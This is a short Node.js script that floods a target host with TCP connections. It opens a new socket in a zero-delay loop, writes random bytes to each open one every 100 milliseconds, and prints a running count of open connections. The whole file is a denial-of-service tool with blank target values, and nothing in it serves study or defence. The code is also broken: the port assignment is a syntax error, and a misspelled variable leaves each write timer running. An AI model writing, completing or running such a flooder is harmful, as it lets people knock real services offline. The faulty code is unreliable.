const net = require("net");

const Rand = (max) => Math.floor(Math.random() * max);

const ip = "";
const port = ;

let openConnection = 0;

setInterval(() => {
    const client = new net.Socket();

    let interval;

    client.once("connect", () => {
        openConnection++;
        internval = setInterval(() => {
            if (client.writable)
            client.write(Buffer.from(Array.from({length: 40}, () => Math.floor(Math.random() * 40+1))));

        }, 100);
    });

    client.once("close", () => {
        openConnection--;
        clearInterval(interval);
    })

    client.once("error", (err) => {
        
    });


    client.connect(port, ip);

    process.stdout.cursorTo(0, 0, () => {
        process.stdout.write(`openConnection: ${openConnection}`);
    });

}, 0);

process.stdout.clearLine(1);
